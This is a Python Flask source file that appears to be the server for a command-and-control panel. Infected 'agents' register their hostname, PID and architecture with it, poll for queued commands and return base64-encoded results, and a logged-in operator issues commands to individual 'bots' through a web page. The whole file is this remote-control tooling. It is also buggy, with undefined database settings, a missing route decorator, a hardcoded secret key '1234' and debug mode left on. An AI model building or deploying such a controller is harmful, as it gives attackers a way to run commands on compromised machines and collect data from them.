from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory, jsonify
from psycopg2.extras import RealDictCursor
import psycopg2,hashlib,os,base64


app = Flask(__name__)
app.config['SECRET_KEY'] = '1234'  # Replace with a strong, random secret key
app.config['SQLALCHEMY_DATABASE_URI']='postgresql://postgres:admin@localhost/postgres'

# Database configuration (replace with your credentials)


def connect_to_db():
    try:
        conn = psycopg2.connect(
            database=DB_NAME,
            user=DB_USER,
            password=DB_PASSWORD,
            host=DB_HOST,
            port=DB_PORT
        )
        return conn
    except (Exception, psycopg2.Error) as error:
        print("Error while connecting to PostgreSQL", error)
        return None

# Initialize database for agents
def init_db(): 
    conn = connect_to_db()
    if conn is None:
        return None

    cursor = conn.cursor() 
    cursor.execute('''CREATE TABLE IF NOT EXISTS agents ( id SERIAL PRIMARY KEY, hostname TEXT NOT NULL, pid INTEGER, process_name TEXT, architecture TEXT, last_callback TIMESTAMP, command TEXT, result TEXT)''') 
    conn.commit() 
    cursor.close() 
    conn.close()


@app.route('/register_agent', methods=['POST'])
def register_agent():
    data = request.json
    print(data)
    hostname = data.get('hostname', '')
    pid = data.get('pid', '')
    process_name = data.get('process_name', '')
    architecture = data.get('architecture', '')

    conn = connect_to_db()
    if conn is None:
        return None

    cursor = conn.cursor() 
    cursor.execute("INSERT INTO agents (hostname, pid, process_name, architecture, last_callback) VALUES (%s, %s, %s, %s, now())",
                   (hostname, pid, process_name, architecture))
    conn.commit()
    cursor.close()
    conn.close()
    
    return "Agent registered successfully!", 200

@app.route('/delete_agent/<int:agent_id>', methods=['POST'])
def delete_agent(agent_id):
    conn = connect_to_db()
    if conn is None:
        return jsonify({"error": "Database connection failed"}), 500
    
    try:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM agents WHERE id = %s", (agent_id,))
        conn.commit()
        cursor.close()
        conn.close()
        return redirect(url_for('index')) # Redirect to the index route
    except Exception as e:
        print("Error:", e)
        return jsonify({"error": "Failed to delete agent"}), 500




@app.route('/send_command', methods=['POST'])
def send_command():
    conn = connect_to_db()
    if conn is None:
        return None
    
    data = request.json
    hostname = data.get('hostname', '')
    command = data.get('command', '')

    cursor = conn.cursor() 
    cursor.execute("UPDATE agents SET command = %s WHERE hostname = %s", (command, hostname))
    conn.commit()
    cursor.close()
    conn.close()
    
    return "Command sent successfully!", 200

def fetch_command():
    data = request.json
    hostname = data.get('hostname', '')

    conn = connect_to_db()
    if conn is None:
        return None
    cursor = conn.cursor()
    cursor.execute("SELECT command FROM agents WHERE hostname = %s", (hostname,))
    row = cursor.fetchone()
    cursor.execute("UPDATE agents SET last_callback = now() WHERE hostname = %s", (hostname,))
    conn.commit()
    cursor.close()
    conn.close()

    if row:
        return jsonify({'command': row['command']}), 200
    return "No command found", 404



@app.route('/send_result', methods=['POST'])
def send_result():
    conn = connect_to_db()
    if conn is None:
            return None
    
    data = request.json
    hostname = data.get('hostname', '')
    encoded_result = data.get('result', '')

    if encoded_result:
        decoded_bytes = base64.b64decode(encoded_result)
        decoded_result = decoded_bytes.decode('utf-8')
        
        cursor = conn.cursor()
        cursor.execute("UPDATE agents SET result = %s, last_callback = now() WHERE hostname = %s", (decoded_result, hostname))
        conn.commit()
        cursor.close()
        conn.close()
        
        return "Result received and saved successfully!", 200
    return "No result received", 400


@app.route('/get_results', methods=['GET'])
def get_results():
    conn = connect_to_db()
    if conn is None:
        return None
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    cursor.execute("SELECT id, pid, process_name, architecture, last_callback FROM agents")
    rows = cursor.fetchall()
    cursor.close()
    conn.close()
    return jsonify(rows), 200


def authenticate_user(username, password):
    conn = connect_to_db()
    if conn is None:
        return None

    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
    user = cur.fetchone()
    cur.close()
    conn.close()
    return user

def get_agents_data():
    conn = connect_to_db()
    if conn is None:
        return None

    cur = conn.cursor()
    cur.execute("SELECT * FROM agents")
    rows = cur.fetchall()
    conn.close()
    return rows


@app.route('/')
def index():
    agents_data = get_agents_data()
    if 'username' in session:  # Check if user is logged in
        # Consider personalized content based on logged-in user
        return render_template('index.html',agents=agents_data)
    else:
        return redirect(url_for('login'))  # Redirect to login if not logged in

@app.route('/bot/<int:bot_id>', methods=['GET', 'POST'])
def bot(bot_id):
    conn = connect_to_db()
    if conn is None:
        return "Database connection failed", 500

    cur = conn.cursor()
    cur.execute("SELECT * FROM agents WHERE id = %s", (bot_id,))
    bot_data = cur.fetchone()

    cur.execute("SELECT result FROM agents WHERE id = %s", (bot_id,))
    encoded_data = cur.fetchone()
    
    if encoded_data[0] != None:
        # Decode the string
        decoded_bytes = base64.b64decode(encoded_data[0])

        # Convert the decoded bytes to a string
        decoded_data = decoded_bytes.decode('utf-8')
        

    if not bot_data:
        return f"No bot found with ID {bot_id}", 404

    if request.method == 'GET' and 'username' in session:  # Check if user is logged in
        return render_template('bot.html', bot_id=bot_id, bot_data=bot_data, decoded_data=decoded_data)
    elif request.method == 'POST':
        cmd = request.form['cmd']
        cur = conn.cursor()
        cur.execute("UPDATE agents SET command = %s WHERE id = %s", (cmd, bot_id))
        conn.commit()
        cur.close()
        conn.close()
        return redirect(url_for('bot', bot_id=bot_id))  # Refresh to display the new command
    else:
        return redirect(url_for('login'))  # Redirect to login if not logged in
    


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
         if 'username' in session:  # Check if user is logged in
             return redirect(url_for('index'))
             
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        user = authenticate_user(username, hashlib.sha256(password.encode('utf-8')).hexdigest())

        if user:
            # Successful login
            session['username'] = username
            return redirect(url_for('index'))  # Redirect to index after login
        else:
            # Invalid credentials
            error = "Invalid username or password."
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))  # Redirect to login 


if __name__ == '__main__':
    init_db()
    app.run(host='192.168.1.101', port=5000, debug=True)
